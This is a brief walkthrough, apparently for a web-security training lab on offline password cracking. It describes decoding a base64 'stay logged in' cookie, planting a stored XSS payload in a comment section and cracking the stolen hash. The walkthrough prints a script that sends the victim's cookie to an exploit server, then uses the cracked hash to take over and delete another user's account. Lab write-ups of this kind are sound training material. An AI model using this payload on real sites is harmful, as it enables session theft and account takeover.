# Offline password cracking
Solution:
- Login as `weiner:peter` with the `Stay logged in` functionality
- Notice that the cookie is base64 encode of `username:md5sum(password)`
- The comment section is vulnerable to XSS
- Insert an XSS payload in the comment that sends the cookie to the exploit server
```js
<script>
document.location = "exploit-server-id.web-security-academy.net/?c=" + document.cookie;
</script>
```
- Visit the access log on the exploit server
- Get  the cookie and crack the hash (you can use crackstation)
- Login as carlos and delete his account to solve the lab